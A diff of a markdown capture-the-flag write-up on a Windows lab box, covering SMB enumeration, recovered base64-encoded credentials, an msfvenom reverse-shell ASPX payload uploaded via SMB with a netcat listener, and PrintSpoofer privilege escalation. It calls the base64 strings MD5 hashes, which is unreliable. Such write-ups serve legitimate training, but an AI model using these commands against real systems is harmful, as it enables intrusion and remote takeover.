@@ -48,7 +48,8 @@ crackmapexec smb 10.10.97.109 -u "" -p "" --shares
 crackmapexec smb 10.10.97.109 -u "gust" -p "" --shares
 
 ```
-![[Pasted image 20230614185247.png]]
+![crackmapexec show us the SMB shares]({{site.baseurl}}/_posts/Pasted image 20230614185247.png)
+
 
 - Found `passowrds.txt` then create smb directory and move it there.
 
@@ -56,15 +57,16 @@ crackmapexec smb 10.10.97.109 -u "gust" -p "" --shares
 crackmapexec smb 10.10.176.144 -u "gust" -p "" -M spider_plus
 smbclient //10.10.176.144/nt4wrksv -U ""
 ```
+- The users passwords was MD5 hashed.
 
-
-``` TXT
-[User Passwords - Encoded]
+> The Hash
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+
+> The Plain Text
 Bob:!P@$$W0rD!123
-Bill:Juw4nnaM4n420696969!$$$                                              
-```
+Bill:Juw4nnaM4n420696969!$$$                                          
+
 
 ### SMB relay
 - From nmap and cme the SMB signing is disable, so smb relay may work.
@@ -79,31 +81,25 @@ Bill:Juw4nnaM4n420696969!$$$
 
 
 ``` bash
-
 msfvenom -p windows/x64/shell_reverse_tcp LPORT=9001 LHOST=10.9.78.51  -f aspx -o shell.aspx 
-
 smbclient //10.10.247.115/nt4wrksv -U 'bob'
 smb: \> put shell.aspx
-
 sudo rlwrap nc -lnvp 9001
 ```
 
 ## Local Enumeration 
 
 ``` powershell
-
 whoami /all
-
 systeminfo
-
 ```
-![[Pasted image 20230614214734.png]]
+![Bob user priviages]({{site.baseurl}}/_posts/Pasted image 20230614214734.png)
 
 ## PrivEsc
 
 - We found `SeImpersonatePrivilage` so we can run [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) which is Abusing Impersonation Privileges From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.
 
-![[Pasted image 20230614224001.png]]
+![We are SYSTEM!]({{site.baseurl}}/_posts/Pasted image 20230614224001.png)
 
 - Potatoes attack is detected by the AV.
 - There is a problem in kali preventing me performing Etrnalblue MS17-010
